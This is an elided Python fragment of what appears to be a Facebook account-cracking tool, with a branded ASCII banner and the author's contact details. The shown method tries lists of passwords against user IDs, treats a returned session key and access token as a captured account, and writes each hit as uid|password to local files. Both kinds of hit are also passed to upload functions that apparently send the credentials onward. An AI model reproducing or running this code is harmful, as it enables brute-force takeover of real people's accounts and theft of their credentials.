...
| |    |  __'.   | || |   / ____ \   | || |    |  ___/   | | | |   _  | |     | || |      | |     | |
| |   _| |__) |  | || | _/ /    \ \_ | || |   _| |_      | | | |  | |_' |     | || |     _| |_    | |
| |  |_______/   | || ||____|  |____|| || |  |_____|     | | | |  `.___.'     | || |    |_____|   | |
| |              | || |              | || |              | | | |              | || |              | |
| '--------------' || '--------------' || '--------------' | | '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'   '----------------'  '----------------' 
\033[1;90m═══════════════════════════════════════════════════════════
\033[1;94m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : MOHAMMAD ARIF
\033[1;95m [\033[1;94m✯\033[1;91m] \033[1;92mWHATSUP  : +8801747192851
\033[1;93m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB      : @BAPJI-BJ-TM
...
\033[1;90m═══════════════════════════════════════════════════════════
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [PLAY] : %s/%s -> \033[0;92m [ BJ-TM-OK:%s ]- \033[0;91m[BJ-TM-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[BJ-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [BJ-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[BJ-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [BJ-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
